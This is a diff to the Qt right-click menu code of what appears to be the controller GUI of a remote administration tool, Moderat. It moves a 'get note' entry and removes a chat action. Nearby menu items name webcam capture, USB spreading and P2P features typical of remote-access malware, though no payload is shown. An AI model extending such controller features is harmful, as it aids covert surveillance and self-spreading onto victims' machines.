@@ -28,6 +28,8 @@ class moderatRightClickMenu:
         if self.moderat.clientsTable.currentRow() >= 0:
             self.moderat.emenu.addAction(self.moderat.MString('MVIEWER_TITLE'),
                                          lambda: self.moderat.execute_module(module='MVIEWER'))
+            self.moderat.emenu.addAction(self.moderat.MString('NOTE_GET'),
+                                         lambda: self.moderat.execute_module(module='MNOTE'))
             self.moderat.emenu.addAction(self.moderat.MString('LOG_SETTINGS_TITLE'),
                                          self.moderat.set_logs_settings)
             self.moderat.emenu.addSeparator()
@@ -48,8 +50,6 @@ class moderatRightClickMenu:
                                          lambda: self.moderat.execute_module(module='MWEBCAM'))
             self.moderat.emenu.addSeparator()
             self.moderat.emenu.addAction(self.moderat.MString('USB_SPREADING_ON_OFF'), self.moderat.usb_spreading)
-            self.moderat.emenu.addAction(self.moderat.MString('NOTE_GET'),
-                                         lambda: self.moderat.execute_module(module='MNOTE'))
             self.moderat.emenu.addAction(self.moderat.MString('P2P_START'), self.moderat.start_p2p)
             self.moderat.emenu.addSeparator()
             self.moderat.filter_menu = QMenu(self.moderat.MString('FILTER_BY'), self.moderat)
@@ -99,8 +99,6 @@ class moderatRightClickMenu:
     def moderators_menu(self, point):
         self.moderat.emenu = QMenu(self.moderat)
         if self.moderat.moderatorsTable.currentRow() >= 0:
-            self.moderat.emenu.addAction(QIcon(':/icons/assets/chat.png'), self.moderat.MString('MODERATOR_CREATE_CHAT'),
-                                         self.moderat.create_chat)
             self.moderat.emenu.addSeparator()
             self.moderat.emenu.addAction(QIcon(':/icons/assets/add_moderator.png'), self.moderat.MString('MODERATOR_ADD_MDOERATOR'),
                                          self.moderat.create_moderator)
